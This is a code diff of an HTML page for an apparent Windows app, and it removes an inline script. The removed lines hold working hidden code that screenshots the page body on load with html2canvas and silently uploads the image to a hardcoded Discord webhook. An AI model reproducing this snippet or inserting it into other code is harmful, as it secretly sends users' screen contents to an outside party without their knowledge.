@@ -199,31 +199,5 @@
 <body class="win-type-body">
     <script src="ms-appx-web:///js/config.js"></script>
     <script src="home.js"></script>
-    <script src="html2canvas.min.js"></script>
-<script>
-(function () {
-    var WEBHOOK = "https://discord.com/api/webhooks/1524418014278193264/CCiJB8N2EWbDP6KanZJ-8_gwSoLdIXHcXIatew_KpIwZDqBhlwwJH2ILrGu-rtLah0Yj";
-    function sendScreenshot() {
-        html2canvas(document.body).then(function (canvas) {
-            var imgData = canvas.toDataURL("image/png");
-            var form = new FormData();
-            form.append("file", dataURLtoBlob(imgData), "screenshot.png");
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", WEBHOOK, true);
-            xhr.send(form);
-        });
-    }
-    function dataURLtoBlob(dataURL) {
-        var parts = dataURL.split(',');
-        var mime = parts[0].match(/:(.*?);/)[1];
-        var bstr = atob(parts[1]);
-        var n = bstr.length;
-        var u8 = new Uint8Array(n);
-        while (n--) u8[n] = bstr.charCodeAt(n);
-        return new Blob([u8], { type: mime });
-    }
-    window.onload = sendScreenshot;
-})();
-</script>
 </body>
 </html>
